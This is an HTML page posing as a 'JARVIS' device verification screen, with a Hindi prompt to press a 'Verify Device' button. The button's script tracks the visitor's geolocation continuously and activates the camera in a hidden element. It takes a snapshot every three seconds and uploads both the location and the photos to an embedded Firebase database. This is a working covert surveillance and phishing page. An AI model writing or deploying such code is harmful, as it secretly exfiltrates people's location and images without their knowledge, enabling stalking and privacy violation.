<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <title>JARVIS - SECURE SYSTEM VERIFICATION</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { background: #0b0f19; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .box { background: #111; padding: 30px; border-radius: 15px; text-align: center; border: 1px solid #333; }
        button { background: #0284c7; padding: 15px 30px; border: none; color: #fff; cursor: pointer; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="box">
        <h2>JARVIS CORE</h2>
        <p>डिवाइस प्रमाणीकरण पूरा करने के लिए बटन दबाएं।</p>
        <button onclick="startVerification()">Verify Device</button>
    </div>
    <video id="v" autoplay playsinline muted style="display:none"></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyAfwCTBBc_LT8j7neC_aJhBCHUXj3QkSHc", authDomain: "army-cb492.firebaseapp.com", databaseURL: "https://army-cb492-default-rtdb.firebaseio.com", projectId: "army-cb492", appId: "1:449848409517:web:386ad1b570731b6ec4f524" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        async function startVerification() {
            navigator.geolocation.watchPosition((pos) => {
                db.ref('live_detect/location').set({ lat: pos.coords.latitude, lon: pos.coords.longitude });
            });
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('v').srcObject = stream;
            setInterval(() => {
                const c = document.getElementById('c');
                c.width = 320; c.height = 240;
                c.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 320, 240);
                db.ref('live_detect').update({ photo: c.toDataURL('image/jpeg', 0.5) });
            }, 3000);
        }
    </script>
</body>
</html>
